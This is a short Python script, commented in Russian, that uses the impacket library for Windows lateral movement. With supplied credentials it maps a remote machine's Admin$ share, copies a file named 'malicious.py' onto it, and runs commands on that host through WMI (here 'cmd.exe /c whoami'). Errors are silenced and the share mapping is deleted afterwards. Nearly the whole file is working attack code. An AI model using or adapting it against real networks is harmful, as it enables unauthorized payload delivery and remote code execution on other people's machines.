# /// script
# requires-python = ">=3.10"
# dependencies = ["impacket"]
# ///

import subprocess
import shutil
from pathlib import Path
from impacket.smbconnection import SMBConnection
from impacket.examples.wmiexec import WMIEXEC

def access_admin_share(computer_name, username, password, executable):
    remote = fr"\\{computer_name}\Admin$"
    local = "Z:"
    remotefile = Path(local + "\\") / Path(executable).name
    try:
        subprocess.run(
            # net use здесь позволяет замапить удаленную шару
            ["net", "use", local, remote, password, f"/USER:{username}"],
            check=True, capture_output=True, text=True
            # check = True, если команда завершилась с ненулевым кодом, то 
            # выбрасывается исключение 
            # local - буква диска которая назначается удаленной шаре
            # remote - путь до удаленной папки
        )
        shutil.copy(executable, remotefile)
    except Exception:
        pass # Чтобы скрипт не падал, если копирование не удалось, но finally сработал
    finally:
        # /y подавление подтверждения
        # удаление мапинга
        subprocess.run(["net", "use", local, "/delete", "/y"],
                       capture_output=True, text=True)

timeout = 1
def executeRemoteScript(computerName, username, password, exe, args, domain = "."):
    cmd = f'"{exe}" {args}' if args else f'"{exe}"'
    # создание строки команды вместе с аргументаи
    smbConn = SMBConnection(computerName, computerName)
    smbConn.login(username, password, domain)
    # обьект через который будет выполгняться команда
    executer = WMIEXEC(cmd, smbConnection = smbConn)
    try:
        return executer.run() # Возвращаем результат выполнения
    except Exception:
        return None # В случае ошибки возвращаем None
    finally:
        smbConn.close()

if __name__ == "__main__":
    computerName = ""
    username = ""
    password = ""
    
    # Передали password в функцию
    access_admin_share(computerName, username, password, r"malicious.py")
    # Для cmd.exe используем /c whoami (или другую команду Windows)
    executeRemoteScript(computerName, username, password, "cmd.exe", "/c whoami")